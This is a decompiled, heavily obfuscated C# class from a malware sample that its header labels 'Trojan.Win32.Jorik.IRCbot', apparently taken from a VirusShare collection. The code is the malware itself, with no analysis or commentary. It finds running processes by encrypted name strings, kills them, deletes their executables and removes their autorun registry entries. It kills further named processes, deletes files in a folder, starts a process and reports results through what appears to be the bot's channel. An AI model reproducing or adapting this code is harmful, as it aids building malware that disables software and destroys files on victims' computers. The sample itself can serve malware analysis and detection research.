// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0005;
using \u000E;
using \u000F;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0005
{
  internal sealed class \u0001
  {
    public static List<string> \u0001;
    public static List<string> \u0002;
    [NonSerialized]
    internal static \u0008.\u0004 \u009E;

    public static void \u0001()
    {
      \u0001.\u0002 = new List<string>();
      Process[] processArray = \u0001.\u0001();
      int index = 0;
      while (true)
      {
        int num1 = index;
        int num2 = processArray.Length;
        int num3;
        while (true)
        {
          num3 = num2;
          if (false)
            num2 = num3;
          else
            break;
        }
        if (num1 < num3)
        {
          Process process = processArray[index];
          try
          {
            if (global::\u0005.\u007E\u0081((object) \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) process)), global::\u0004.\u001C(\u0001.\u009E(258))) || global::\u0005.\u007E\u0081((object) \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) process)), global::\u0004.\u001C(\u0001.\u009E(279))))
              goto label_3;
label_2:
            if (!global::\u0005.\u007E\u0081((object) \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) process)), global::\u0004.\u001C(\u0001.\u009E(292))))
              goto label_8;
label_3:
            if (true)
            {
              if (\u0007.\u0087(\u0003.\u007E\u0004((object) process), \u0003.\u007E\u0004((object) \u0006.\u0086())))
                \u0001.\u0001(\u0003.\u007E\u0004((object) process), \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) process)));
            }
            else
              goto label_2;
          }
          catch
          {
          }
label_8:
          ++index;
        }
        else
          break;
      }
      \u0001.\u0003();
    }

    public static void \u0001([In] string obj0, [In] string obj1)
    {
      \u0001.\u0002(obj0, obj1);
      \u0001.\u0003(obj0, obj1);
    }

    public static void \u0002([In] string obj0, [In] string obj1)
    {
      try
      {
        RegistryKey registryKey = global::\u0008.\u007E\u0089((object) Registry.CurrentUser, \u0001.\u009E(301));
        foreach (string str in global::\u000E.\u007E\u008A((object) registryKey))
        {
          if (global::\u0005.\u007E\u0081((object) \u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) registryKey, str)), obj1) && \u0007.\u0087(str, \u0001.\u0015))
          {
            \u0001.\u0002.Add(\u0011.\u008E(\u0001.\u009E(362), \u0002.\u0001(\u0010.\u008D(\u0001.\u009E(395), str)), \u0001.\u009E(404)));
            \u0012.\u007E\u008F((object) registryKey, str);
            \u0013.\u007E\u009C((object) registryKey);
          }
        }
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = global::\u0008.\u007E\u0089((object) Registry.LocalMachine, \u0001.\u009E(301));
        foreach (string str in global::\u000E.\u007E\u008A((object) registryKey))
        {
          if (global::\u0005.\u007E\u0081((object) \u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) registryKey, str)), obj1) && \u0007.\u0087(str, \u0001.\u0015))
          {
            \u0001.\u0002.Add(\u0011.\u008E(\u0001.\u009E(362), \u0002.\u0001(\u0010.\u008D(\u0001.\u009E(409), str)), \u0001.\u009E(404)));
            \u0012.\u007E\u008F((object) registryKey, str);
            \u0013.\u007E\u009C((object) registryKey);
          }
        }
      }
      catch
      {
      }
    }

    public static void \u0003([In] string obj0, [In] string obj1)
    {
      \u0001.\u0001 = \u0002.\u0001();
      try
      {
        foreach (Process process in \u0014.\u0015\u0002(obj0))
        {
          if (\u0007.\u0087(obj0, \u0001.\u009E(418)) && \u0007.\u0087(obj0, \u0001.\u009E(431)) && \u0007.\u0087(\u0001.\u0001, \u0003.\u007E\u0003((object) \u0002.\u007E\u0002((object) process))))
          {
            foreach (string str1 in \u0001.\u0001)
            {
              string[] strArray1 = \u0015.\u007E\u0016\u0002((object) str1, new char[1]
              {
                ':'
              });
              string str2 = \u0011.\u008E(strArray1[0], \u0001.\u009E(440), strArray1[1]);
              string str3 = \u0003.\u007E\u0004((object) \u0017.\u0019\u0002(\u0016.\u0017\u0002(strArray1[2])));
              if (\u0007.\u0088(str3, \u0003.\u007E\u0004((object) process)))
              {
                List<string> stringList = \u0001.\u0002;
                string[] strArray2 = new string[5]
                {
                  \u0001.\u009E(445),
                  \u0002.\u0001(\u0010.\u008D(\u0001.\u009E(490), \u0003.\u007E\u0004((object) process))),
                  \u0001.\u009E(495),
                  \u0002.\u0001(\u0010.\u008D(\u0001.\u009E(490), str2)),
                  \u0001.\u009E(404)
                };
                string str4 = \u0018.\u001A\u0002(strArray2);
                stringList.Add(str4);
              }
            }
            try
            {
              \u0002.\u0001(\u0019.\u007E\u001B\u0002((object) process));
            }
            catch
            {
            }
            \u0013.\u007E\u009E((object) process);
            \u0013.\u007E\u009F((object) process);
            \u0013.\u007E\u0001\u0002((object) process);
            \u001A.\u0081\u0002(obj1, FileAttributes.Normal);
            \u001B.\u0082\u0002(obj1);
            \u0001.\u0002.Add(\u0011.\u008E(\u0001.\u009E(500), \u0002.\u0001(obj1), \u0001.\u009E(521)));
          }
        }
      }
      catch
      {
      }
      if (false)
        return;
      \u0001.\u0001.Clear();
    }

    public static void \u0002()
    {
      \u0001.\u0002 = new List<string>();
      Process[] processArray1 = \u0014.\u0015\u0002(\u0001.\u009E(526));
      if (true)
        goto label_29;
label_1:
      if (true)
      {
        if (false)
          goto label_8;
        else
          goto label_8;
      }
      else
        goto label_18;
label_7:
      int num1;
      int index1 = num1 + 1;
label_8:
      int num2 = index1;
      int length = processArray1.Length;
      Process[] processArray2;
      int index2;
      int num3;
      int num4;
      if (true)
      {
        if (num2 >= length)
        {
          processArray2 = \u0014.\u0015\u0002(\u0001.\u009E(539));
          index2 = 0;
        }
        else
        {
          Process process = processArray1[index1];
          try
          {
            do
            {
              \u0013.\u007E\u009E((object) process);
            }
            while (false);
            \u0013.\u007E\u009F((object) process);
            \u0013.\u007E\u0001\u0002((object) process);
          }
          catch
          {
          }
          num1 = index1;
          goto label_7;
        }
      }
      else
      {
        num4 = length;
        num3 = num2;
        goto label_19;
      }
label_18:
      num3 = index2;
      num4 = processArray2.Length;
label_19:
      int num5 = num4;
      if (num3 < num5)
      {
        Process process = processArray2[index2];
        try
        {
          \u0013.\u007E\u009E((object) process);
          \u0013.\u007E\u009F((object) process);
          \u0013.\u007E\u0001\u0002((object) process);
        }
        catch
        {
        }
        num1 = index2;
        if (true)
        {
          if (true)
            ++num1;
          index2 = num1;
          goto label_18;
        }
        else
          goto label_7;
      }
      else
      {
        try
        {
          string[] strArray1 = \u001C.\u0083\u0002(global::\u0004.\u001C(\u0001.\u009E(279)), \u0001.\u009E(552));
          string[] strArray2;
          int index3;
          if (true)
          {
            strArray2 = strArray1;
            index3 = 0;
          }
          for (; index3 < strArray2.Length; ++index3)
          {
            string str1 = strArray2[index3];
            string str2 = str1;
            string str3 = \u001D.\u007E\u0084\u0002((object) str1, 0, \u0019.\u007E\u001C\u0002((object) str1) - 4);
            string str4 = \u001D.\u007E\u0084\u0002((object) str1, 0, \u0019.\u007E\u001C\u0002((object) str2));
            if (!global::\u0005.\u007E\u0081((object) str1, \u0001.\u009E(418)) && !global::\u0005.\u007E\u0081((object) str1, \u0001.\u009E(431)))
            {
              \u001B.\u0082\u0002(str2);
              \u0001.\u0002(str4, str2);
              \u0001.\u0002.Add(\u0011.\u008E(\u0001.\u009E(500), \u0002.\u0001(str2), \u0001.\u009E(521)));
            }
          }
          Process process = \u001E.\u0086\u0002(\u0001.\u009E(561));
          \u0001.\u0003();
          return;
        }
        catch
        {
          Process process = \u001E.\u0086\u0002(\u0001.\u009E(561));
          return;
        }
      }
label_29:
      index1 = 0;
      goto label_1;
    }

    private static void \u0003()
    {
      List<string> stringList = new List<string>();
      do
      {
        List<string>.Enumerator enumerator = \u0001.\u0002.GetEnumerator();
        try
        {
label_8:
          int num;
          for (int index = enumerator.MoveNext() ? 1 : 0; index != 0; index = num)
          {
            string current;
            if (true)
            {
              current = enumerator.Current;
              num = stringList.Contains(current) ? 1 : 0;
              if (true)
              {
                if (num != 0)
                  goto label_8;
              }
              else
                continue;
            }
            stringList.Add(current);
            goto label_8;
          }
        }
        finally
        {
          do
          {
            enumerator.Dispose();
          }
          while (false);
        }
        if (true)
        {
          foreach (string str in stringList)
          {
            \u0002.\u0001(str, \u0001.\u0012);
            if (true)
              \u001F.\u0087\u0002(200);
            else
              break;
          }
          \u0001.\u0002.Clear();
        }
        stringList.Clear();
      }
      while (false);
    }

    static \u0001()
    {
      do
      {
        \u0004.\u0005.\u0001(typeof (\u0001));
        bool flag = false;
        Assembly assembly = \u007F.\u0089\u0002();
        if (\u0001.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
          goto label_7;
label_5:
        throw new SecurityException(\u0001.\u009E(603));
label_7:
        int num = flag ? 1 : 0;
        if (true)
        {
          if (num != 0)
            num = global::\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0001.\u009E(578)) ? 1 : 0;
          else
            goto label_5;
        }
        if (num == 0)
          goto label_5;
      }
      while (false);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
